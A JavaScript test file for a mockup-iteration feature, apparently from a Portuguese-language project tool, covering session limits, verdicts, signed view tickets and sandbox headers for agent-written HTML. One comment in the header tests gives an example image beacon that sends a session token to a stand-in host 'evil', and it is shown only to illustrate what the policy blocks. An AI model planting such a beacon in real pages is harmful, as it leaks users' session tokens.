/**
 * Camada 0 — the throwaway loop.
 *
 * The two properties that matter most are asserted here and are easy to lose in a later
 * refactor: iterating must move **no** stage fingerprint (or a running Execução halts),
 * and the render route must emit the sandbox headers (or an agent-written page can read
 * the session token out of localStorage).
 */
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

const sessions = require('../lib/mockup-sessions');
const workSnapshot = require('../lib/work-snapshot');
const { RENDER_HEADERS, signTicket, ticketValid, TICKET_TTL_MS } = require('../lib/mockup-routes');
const { extractHtml, instructionsFor } = require('../lib/mockup-runner');

function project(over = {}) {
  return { id: 'prj_1', name: 'Reservas', mockupSessions: [], diagramArtifacts: [], ...over };
}

const SCREEN = '<!doctype html><html><body><h1>Reservas</h1></body></html>';

function seeded(turns = 1, html = SCREEN) {
  const p = project();
  const session = sessions.startSession(p, { promptText: 'Um ecrã para marcar mesas.' });
  let previous = '';
  for (let i = 0; i < turns; i += 1) {
    const body = typeof html === 'function' ? html(i) : html;
    sessions.addIteration(p, session.id, { html: body, costUsd: 0.01 }, previous);
    previous = body;
  }
  return { p, session: sessions.findSession(p, session.id) };
}

describe('the loop', () => {
  it('refuses to start without an intention to work from', () => {
    assert.throws(() => sessions.startSession(project(), { promptText: '  ' }), /duas ou três frases/);
  });

  it('records each turn and what it cost', () => {
    const { session } = seeded(3);
    assert.equal(session.iterations.length, 3);
    assert.equal(Number(session.spentUsd.toFixed(2)), 0.03);
  });

  it('stops at the iteration ceiling, and says what to do instead', () => {
    const p = project();
    const session = sessions.startSession(p, { promptText: 'Um ecrã.', maxIterations: 2 });
    sessions.addIteration(p, session.id, { html: SCREEN }, '');
    sessions.addIteration(p, session.id, { html: SCREEN }, SCREEN);
    const reason = sessions.blockedReason(sessions.findSession(p, session.id));
    assert.match(reason, /o problema está no pedido/);
    assert.throws(() => sessions.addIteration(p, session.id, { html: SCREEN }, SCREEN));
  });

  it('stops at the cost ceiling', () => {
    const p = project();
    const session = sessions.startSession(p, { promptText: 'Um ecrã.', maxCostUsd: 0.5 });
    sessions.addIteration(p, session.id, { html: SCREEN, costUsd: 0.6 }, '');
    assert.match(sessions.blockedReason(sessions.findSession(p, session.id)), /já gastou/);
  });

  it('rejects an empty screen rather than storing one', () => {
    const p = project();
    const session = sessions.startSession(p, { promptText: 'Um ecrã.' });
    assert.throws(() => sessions.addIteration(p, session.id, { html: '   ' }, ''), /vazio/);
  });
});

describe('the settling signal', () => {
  it('says the screen has stopped moving when barely anything changed', () => {
    const { p, session } = seeded(1);
    sessions.addIteration(p, session.id, { html: SCREEN.replace('Reservas</h1>', 'Reservas </h1>') }, SCREEN);
    const view = sessions.sessionView(sessions.findSession(p, session.id));
    assert.equal(view.settled, true);
    assert.match(view.settledHint, /estabilizou/);
  });

  it('stays quiet while the screen is still changing substantially', () => {
    const { p, session } = seeded(1);
    const rewritten = `<!doctype html><html><body>${
      Array.from({ length: 40 }, (_, i) => `<section><h2>Bloco ${i}</h2><p>Texto ${i}</p></section>`).join('\n')
    }</body></html>`;
    sessions.addIteration(p, session.id, { html: rewritten }, SCREEN);
    assert.equal(sessions.sessionView(sessions.findSession(p, session.id)).settled, false);
  });

  it('never claims settled on the first turn, which has nothing to compare against', () => {
    const { p, session } = seeded(1);
    assert.equal(sessions.sessionView(sessions.findSession(p, session.id)).settled, false);
    assert.equal(session.iterations[0].changedLines, 0);
  });
});

describe('iterating must not disturb anything the chain reads', () => {
  it('moves no stage fingerprint, however many turns it takes', () => {
    const p = project({
      intake: { answers: [{ questionId: 'quem-usa', answer: 'recepção' }] },
      discovery: 'algo',
      requirements: [{ id: 'FR-001', title: 'X' }],
    });
    const before = workSnapshot.stagesSnapshot(p, ['idea', 'discovery', 'requirements']);

    const session = sessions.startSession(p, { promptText: 'Um ecrã para marcar mesas.' });
    let previous = '';
    for (let i = 0; i < 5; i += 1) {
      const html = `${SCREEN}<!-- turn ${i} -->`;
      sessions.addIteration(p, session.id, { html, costUsd: 0.01 }, previous);
      previous = html;
    }

    assert.deepEqual(workSnapshot.stagesSnapshot(p, ['idea', 'discovery', 'requirements']), before);
  });

  it('moves the discovery fingerprint exactly once, on approval', () => {
    const { p, session } = seeded(2);
    const beforeApproval = workSnapshot.fingerprint(workSnapshot.stageSnapshot(p, 'discovery'));

    sessions.recordVerdict(p, session.id, session.iterations[0].id, 'changes');
    assert.equal(
      workSnapshot.fingerprint(workSnapshot.stageSnapshot(p, 'discovery')),
      beforeApproval,
      'asking for changes is still iterating, and must not move it',
    );

    // Approval is what the routes promote into diagramArtifacts.
    p.diagramArtifacts.push({
      id: 'diag_1', kind: 'mockup', title: 'Aprovado',
      mockupSessionId: session.id, mockupIterationId: session.iterations[1].id,
    });
    assert.notEqual(
      workSnapshot.fingerprint(workSnapshot.stageSnapshot(p, 'discovery')),
      beforeApproval,
    );
  });

  it('ignores a diagram that merely mentions a mockup in its title', () => {
    const p = project({
      diagramArtifacts: [{ id: 'd1', kind: 'diagram', title: 'Notas sobre o mockup e os ecrãs' }],
    });
    // The old regex matched on words in a title, so an unrelated text file could move
    // the discovery fingerprint and mark three personas stale.
    assert.deepEqual(workSnapshot.stageSnapshot(p, 'discovery').stage.mockups, []);
  });
});

describe('the three verdicts', () => {
  it('approving closes the session and names the version that won', () => {
    const { p, session } = seeded(2);
    const target = session.iterations[1].id;
    const after = sessions.recordVerdict(p, session.id, target, 'approved');
    assert.equal(after.status, 'approved');
    assert.equal(after.approvedIterationId, target);
    assert.match(sessions.blockedReason(after), /já foi aprovada/);
  });

  it('discarding closes it without promoting anything', () => {
    const { p, session } = seeded(1);
    const after = sessions.recordVerdict(p, session.id, session.iterations[0].id, 'discarded');
    assert.equal(after.status, 'discarded');
    assert.equal(after.approvedIterationId, '');
  });

  it('asking for changes keeps it open', () => {
    const { p, session } = seeded(1);
    const after = sessions.recordVerdict(p, session.id, session.iterations[0].id, 'changes');
    assert.equal(after.status, 'iterating');
    assert.equal(sessions.blockedReason(after), '');
  });

  it('refuses a verdict it does not offer', () => {
    const { p, session } = seeded(1);
    assert.throws(() => sessions.recordVerdict(p, session.id, session.iterations[0].id, 'talvez'), /desconhecida/);
  });
});

describe('serving agent-written HTML', () => {
  const csp = RENDER_HEADERS['Content-Security-Policy'];

  it('puts the document in an opaque origin, so it cannot reach localStorage', () => {
    // The bare `sandbox` directive with no allow-* tokens. It applies even when the URL
    // is opened top-level, which the iframe attribute alone does not.
    assert.match(csp, /(^|;\s*)sandbox(;|$)/);
    assert.doesNotMatch(csp, /allow-scripts/);
    assert.doesNotMatch(csp, /allow-same-origin/);
  });

  it('blocks script execution and every outbound request', () => {
    assert.match(csp, /default-src 'none'/);
    assert.doesNotMatch(csp, /script-src/);
    // img-src is data: only — no `<img src="https://evil/?token=">` beacon.
    assert.match(csp, /img-src data:/);
    assert.doesNotMatch(csp, /img-src[^;]*https/);
  });

  it('refuses to be framed elsewhere, submitted, or sniffed', () => {
    assert.match(csp, /frame-ancestors 'self'/);
    assert.match(csp, /form-action 'none'/);
    assert.match(csp, /base-uri 'none'/);
    assert.equal(RENDER_HEADERS['X-Content-Type-Options'], 'nosniff');
    assert.equal(RENDER_HEADERS['Cache-Control'], 'no-store');
  });
});

describe('the view ticket', () => {
  const os = require('node:os');
  const fs = require('node:fs');
  const path = require('node:path');
  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mockup-ticket-'));
  const args = ['prj_1', 'mock_1', 'iter_1'];

  it('opens the one mockup it was issued for', () => {
    const ticket = signTicket(dataDir, ...args);
    assert.equal(ticketValid(dataDir, ...args, ticket), true);
  });

  it('does not open any other mockup, project or iteration', () => {
    const ticket = signTicket(dataDir, ...args);
    assert.equal(ticketValid(dataDir, 'prj_2', 'mock_1', 'iter_1', ticket), false);
    assert.equal(ticketValid(dataDir, 'prj_1', 'mock_2', 'iter_1', ticket), false);
    assert.equal(ticketValid(dataDir, 'prj_1', 'mock_1', 'iter_2', ticket), false);
  });

  it('expires, and an expired one is not merely old but refused', () => {
    const issued = Date.now() - (TICKET_TTL_MS * 2);
    const ticket = signTicket(dataDir, ...args, issued);
    assert.equal(ticketValid(dataDir, ...args, ticket), false);
  });

  it('cannot be forged by moving the expiry forward', () => {
    const ticket = signTicket(dataDir, ...args);
    const [, signature] = ticket.split('.');
    const stretched = `${Date.now() + 86400000}.${signature}`;
    assert.equal(ticketValid(dataDir, ...args, stretched), false);
  });

  it('refuses anything that is not a ticket', () => {
    for (const bad of ['', null, undefined, 'nonsense', '123', '.', 'abc.def']) {
      assert.equal(ticketValid(dataDir, ...args, bad), false, String(bad));
    }
  });
});

describe('reading a screen out of a model response', () => {
  it('takes the document out of a fenced block', () => {
    assert.match(extractHtml('Aqui está:\n```html\n<!doctype html><p>oi</p>\n```'), /^<!doctype html>/);
  });

  it('drops a preamble before the document', () => {
    assert.match(extractHtml('Claro! <!doctype html><html></html>'), /^<!doctype html>/);
  });

  it('wraps bare markup rather than throwing away a usable screen', () => {
    assert.match(extractHtml('<section><h1>Reservas</h1></section>'), /^<!doctype html>/);
  });

  it('returns nothing when there is no screen in the answer', () => {
    assert.equal(extractHtml('Não consigo fazer isso.'), '');
    assert.equal(extractHtml(''), '');
  });

  it('tells the agent the same rules the sandbox enforces', () => {
    const prompt = instructionsFor({
      session: { promptText: 'Um ecrã para marcar mesas.' },
      requestText: '',
      previousHtml: '',
    });
    assert.match(prompt, /Sem <script>/);
    assert.match(prompt, /Sem pedidos de rede/);
  });

  it('asks for an edit rather than a rewrite once a version exists', () => {
    const prompt = instructionsFor({
      session: { promptText: 'Um ecrã.' },
      requestText: 'Põe o botão em cima.',
      previousHtml: SCREEN,
    });
    assert.match(prompt, /não recomece do zero/);
    assert.match(prompt, /Põe o botão em cima/);
  });
});
